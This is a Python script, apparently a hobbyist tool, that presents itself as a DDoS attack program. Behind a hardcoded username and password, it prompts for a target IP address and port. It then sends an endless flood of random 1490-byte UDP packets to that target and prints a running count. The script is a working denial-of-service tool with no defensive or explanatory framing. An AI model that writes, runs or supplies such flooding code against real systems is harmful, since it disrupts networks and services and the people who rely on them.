import banner
import os
import random
import socket
from colorama import Fore
from time import sleep
from getpass import getpass

# login credentials
credentials = ["nurhabib", "pass@@@111"]

# take username and password from user
username = input(Fore.LIGHTBLACK_EX + "Enter Username: ")
password = getpass("Enter Passkeys: ")

# check username and password
if username == credentials[0] and password == credentials[1]:
    print("Login Successfully")
    sleep(3)
    os.system("clear")

    # start DDoS attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    ipAddress = input("Enter Target IP Address: ")
    portNumber = int(input("Enter Target Port Number: "))
    sendPackets = 0
    while True:
        sock.sendto(bytes, (ipAddress, portNumber))
        sendPackets = sendPackets + 1
        print(Fore.GREEN + f"Successfully {sendPackets} Packets sent to {ipAddress}")

else:
    print(Fore.RED + "Wrong Credentials, Please Try Again!!!")
